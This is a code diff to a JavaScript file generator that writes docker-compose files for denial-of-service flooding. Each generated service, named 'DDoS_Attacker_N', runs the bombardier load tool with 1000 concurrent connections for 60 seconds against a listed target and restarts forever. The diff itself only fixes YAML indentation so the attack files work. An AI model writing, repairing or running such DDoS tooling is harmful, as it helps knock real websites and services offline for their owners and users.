@@ -7,7 +7,9 @@ exports.FileGenerator = void 0;
 var fs_1 = __importDefault(require("fs"));
 var lodash_1 = __importDefault(require("lodash"));
 /**
- * This is used to generate and save file for attack
+ * This is used to generate and save file for attack;
+ *
+ * Tabs are not supported by .yml files
  */
 var FileGenerator = /** @class */ (function () {
     function FileGenerator(options) {
@@ -28,11 +30,11 @@ var FileGenerator = /** @class */ (function () {
             fileContent += "version: \"3.9\"\n";
             fileContent += "services:\n";
             for (var i = 0; i < chunk.length; i++) {
-                fileContent += "\ts".concat(i, ":\n");
-                fileContent += "\t\timage: alpine/bombardier\n";
-                fileContent += "\t\tcontainer_name: \"DDoS_Attacker_".concat(i, "\"\n");
-                fileContent += "\t\tcommand: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"".concat(_this.targets[i], "\" ]\n");
-                fileContent += "\t\trestart: \"always\"\n";
+                fileContent += "   s".concat(i, ":\n");
+                fileContent += "      image: alpine/bombardier\n";
+                fileContent += "      container_name: \"DDoS_Attacker_".concat(i, "\"\n");
+                fileContent += "      command: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"".concat(_this.targets[i], "\" ]\n");
+                fileContent += "      restart: \"always\"\n";
             }
             console.log('Saving into file: ', filepath);
             // Remove old files
